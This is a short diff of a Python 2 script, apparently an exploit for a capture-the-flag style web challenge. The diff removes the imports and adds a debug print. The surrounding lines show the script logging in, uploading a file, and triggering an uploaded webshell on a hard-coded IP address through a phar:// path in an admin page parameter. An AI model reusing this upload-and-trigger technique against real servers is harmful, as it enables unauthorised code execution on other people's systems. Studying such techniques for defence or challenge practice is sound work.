@@ -1,7 +1,3 @@
-import sys
-import re
-import requests
-
 reload(sys)
 sys.setdefaultencoding('utf-8')
 
@@ -17,6 +13,8 @@ def upload_file(session_req):
 
 def use_shell(session_req, shell):
 	print session_req.get('http://123.206.7.206:10002/admin/admininfile.php?name=phar://../file123asdp/%s/kk' % shell).text
+
+print "nihaonihaonihao"
 
 session = requests.Session()
 login(session)
